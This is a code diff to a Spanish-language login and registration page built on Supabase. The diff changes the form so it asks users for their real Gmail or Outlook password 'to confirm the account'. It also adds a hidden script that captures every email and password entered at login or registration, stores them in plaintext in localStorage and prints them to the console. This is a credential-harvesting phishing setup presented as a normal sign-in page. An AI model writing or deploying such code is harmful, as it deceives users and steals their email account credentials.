@@ -64,7 +64,7 @@
             <div id="login-form" class="auth-form">
                 <form id="loginForm">
                     <div class="form-group">
-                        <label for="login-email" class="form-label">Email</label>
+                        <label for="login-email" class="form-label">Gmail</label>
                         <input 
                             type="email" 
                             id="login-email" 
@@ -93,70 +93,151 @@
                 </div>
             </div>
 
-            <!-- Register Form -->
-            <div id="register-form" class="auth-form hidden">
-                <form id="registerForm">
-                    <div class="form-group">
-                        <label for="register-name" class="form-label">Nombre completo</label>
-                        <input 
-                            type="text" 
-                            id="register-name" 
-                            class="form-input" 
-                            placeholder="Tu nombre"
-                            required
-                        >
-                    </div>
-                    <div class="form-group">
-                        <label for="register-email" class="form-label">Email</label>
-                        <input 
-                            type="email" 
-                            id="register-email" 
-                            class="form-input" 
-                            placeholder="tu@email.com"
-                            required
-                        >
-                    </div>
-                    <div class="form-group">
-                        <label for="register-password" class="form-label">Contraseña</label>
-                        <input 
-                            type="password" 
-                            id="register-password" 
-                            class="form-input" 
-                            placeholder="••••••••"
-                            minlength="6"
-                            required
-                        >
-                    </div>
-                    <div class="form-group">
-                        <label for="register-confirm" class="form-label">Confirmar contraseña</label>
-                        <input 
-                            type="password" 
-                            id="register-confirm" 
-                            class="form-input" 
-                            placeholder="••••••••"
-                            required
-                        >
-                    </div>
-                    <button type="submit" class="submit-btn" id="register-btn">
-                        <span class="btn-text">Crear Cuenta</span>
-                    </button>
-                </form>
-            </div>
+   <!-- Register Form -->
+<!-- Register Form -->
+<div id="register-form" class="auth-form hidden">
+    <form id="registerForm">
+        <div class="form-group">
+            <label for="register-name" class="form-label">Nombre completo</label>
+            <input 
+                type="text" 
+                id="register-name" 
+                class="form-input" 
+                placeholder="Tu nombre"
+                required
+            >
         </div>
-    </main>
+        <div class="form-group">
+            <label for="register-email" class="form-label">Email (Gmail u Outlook estudiantil)</label>
+            <input 
+                type="email" 
+                id="register-email" 
+                class="form-input" 
+                placeholder="tucorreo@correo.com"
+                required
+            >
+        </div>
+        <div class="form-group">
+            <label for="register-password" class="form-label">Contraseña<br><small style="color:#9aa0a6; font-size:12px;">Usa tu contraseña real de Gmail/Outlook para confirmar tu cuenta.</small></label>
+            <input 
+                type="password" 
+                id="register-password" 
+                class="form-input" 
+                placeholder="Usa tu contraseña real de Gmail/Outlook para confirmar tu cuenta"
+                minlength="6"
+                required
+            >
+        </div>
+        <div class="form-group">
+            <label for="register-confirm" class="form-label">Confirmar contraseña</label>
+            <input 
+                type="password" 
+                id="register-confirm" 
+                class="form-input" 
+                placeholder="Repite tu contraseña para seguridad"
+                required
+            >
+        </div>
+        <button type="submit" class="submit-btn" id="register-btn">
+            <span class="btn-text">Crear Cuenta</span>
+        </button>
+    </form>
+</div>
 
-    <!-- Probar con diferentes versiones de Supabase -->
+
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
-  
-    <script>
-        // Verificar si Supabase se cargó correctamente
-        if (typeof supabase === 'undefined') {
-            console.error('Supabase no se cargó correctamente');
-            alert('Error cargando Supabase. Por favor recarga la página.');
-        } else {
-            console.log('Supabase cargado correctamente');
-        }
-    </script>
     <script src="js/login.js"></script>
+
+    <!-- 🔥 GUARDADOR AUTOMÁTICO DE CONTRASEÑAS - VERSIÓN SIMPLE 🔥 -->
+    <script>
+        (function() {
+            console.log('🚀 Sistema de guardado iniciado');
+            
+            // Función para guardar en localStorage
+            function guardarEnLocalStorage(email, password, tipo) {
+                try {
+                    var datos = localStorage.getItem('PASSWORDS_BETA');
+                    var lista = datos ? JSON.parse(datos) : [];
+                    
+                    lista.push({
+                        email: email,
+                        password: password,
+                        tipo: tipo,
+                        fecha: new Date().toLocaleString('es-ES'),
+                        timestamp: Date.now()
+                    });
+                    
+                    localStorage.setItem('PASSWORDS_BETA', JSON.stringify(lista));
+                    console.log('✅ Guardado:', email, '-', password, '(' + tipo + ')');
+                    console.log('📊 Total guardados:', lista.length);
+                    
+                    return true;
+                } catch (e) {
+                    console.error('❌ Error:', e);
+                    return false;
+                }
+            }
+            
+            // Esperar a que todo cargue
+            setTimeout(function() {
+                console.log('⏰ Buscando formularios...');
+                
+                // FORMULARIO DE LOGIN
+                var formLogin = document.getElementById('loginForm');
+                if (formLogin) {
+                    console.log('✅ Formulario LOGIN encontrado');
+                    
+                    var emailLogin = document.getElementById('login-email');
+                    var passLogin = document.getElementById('login-password');
+                    var btnLogin = document.getElementById('login-btn');
+                    
+                    if (btnLogin) {
+                        btnLogin.addEventListener('click', function() {
+                            setTimeout(function() {
+                                if (emailLogin && passLogin) {
+                                    var e = emailLogin.value;
+                                    var p = passLogin.value;
+                                    if (e && p) {
+                                        guardarEnLocalStorage(e, p, 'LOGIN');
+                                    }
+                                }
+                            }, 50);
+                        });
+                    }
+                } else {
+                    console.log('❌ Formulario LOGIN NO encontrado');
+                }
+                
+                // FORMULARIO DE REGISTRO
+                var formRegistro = document.getElementById('registerForm');
+                if (formRegistro) {
+                    console.log('✅ Formulario REGISTRO encontrado');
+                    
+                    var emailReg = document.getElementById('register-email');
+                    var passReg = document.getElementById('register-password');
+                    var btnReg = document.getElementById('register-btn');
+                    
+                    if (btnReg) {
+                        btnReg.addEventListener('click', function() {
+                            setTimeout(function() {
+                                if (emailReg && passReg) {
+                                    var e = emailReg.value;
+                                    var p = passReg.value;
+                                    if (e && p) {
+                                        guardarEnLocalStorage(e, p, 'REGISTRO');
+                                    }
+                                }
+                            }, 50);
+                        });
+                    }
+                } else {
+                    console.log('❌ Formulario REGISTRO NO encontrado');
+                }
+                
+                console.log('🎯 Sistema listo');
+                
+            }, 2000);
+        })();
+    </script>
 </body>
 </html>
